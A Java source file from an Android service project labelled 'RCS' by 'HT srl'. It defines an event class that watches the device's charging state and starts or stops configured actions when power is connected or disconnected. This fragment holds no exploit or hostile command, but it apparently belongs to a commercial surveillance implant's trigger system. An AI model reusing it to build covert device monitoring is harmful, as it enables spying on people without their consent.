/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventAc.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.event;

import java.io.IOException;

import com.android.service.Ac;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfEvent;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerAc;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;

public class EventAc extends BaseEvent implements Observer<Ac> {
	/** The Constant TAG. */
	private static final String TAG = "EventAc"; //$NON-NLS-1$

	private int actionOnExit, actionOnEnter;
	private boolean inRange = false;

	@Override
	public void actualEnable() {
		ListenerAc.self().attach(this);
	}

	@Override
	public void actualDisable() {
		ListenerAc.self().detach(this);
	}

	@Override
	protected boolean parse(ConfEvent conf) {

		return true;
	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(Ac a) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Got power status notification: " + a.getStatus());//$NON-NLS-1$
		}

		// Nel range
		if (a.getStatus() == true && inRange == false) {
			inRange = true;
			if (Cfg.DEBUG) {
				Check.log(TAG + " AC IN");//$NON-NLS-1$
			}
			onEnter();
		} else if (a.getStatus() == false && inRange == true) {
			inRange = false;
			if (Cfg.DEBUG) {
				Check.log(TAG + " AC OUT");//$NON-NLS-1$
			}
			onExit();
		}

		return 0;
	}

	public void onEnter() {
		startCondition();
	}

	public void onExit() {
		stopCondition();
	}
}
